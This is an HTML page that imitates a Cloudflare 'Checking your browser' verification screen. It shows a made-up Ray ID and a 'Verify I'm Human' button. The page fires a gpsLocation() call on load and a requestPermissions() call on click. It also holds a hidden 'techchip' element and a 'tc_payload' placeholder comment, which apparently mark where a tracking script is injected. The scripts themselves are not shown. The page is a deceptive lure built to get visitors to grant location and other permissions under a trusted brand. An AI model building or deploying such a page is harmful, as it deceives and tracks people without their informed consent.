<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #333;
        }

        .container {
            max-width: 500px;
            padding: 40px;
            text-align: center;
        }

        .logo {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            background: linear-gradient(135deg, #f38020 0%, #f5af19 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 60px;
            color: white;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            font-weight: 500;
        }

        p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            margin: 30px auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #f38020;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: #999;
        }

        .verify-btn {
            background: #f38020;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
        }

        .verify-btn:hover {
            background: #e57010;
        }
    </style>
</head>

<body onload="gpsLocation()">
    <div class="container">
        <div class="logo">‚òÅ</div>
        <h1>Checking your browser...</h1>
        <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
        <p>Please allow up to 5 seconds...</p>
        <div class="spinner"></div>
        <button class="verify-btn" onclick="requestPermissions()">Verify I'm Human</button>
        <div class="footer">
            Performance & security by Cloudflare<br>
            Ray ID: 8d7f2a3b9c1e4f5g
        </div>
    </div>
    <p id="techchip" style="display:none;"></p>
    <!-- tc_payload -->
</body>

</html>
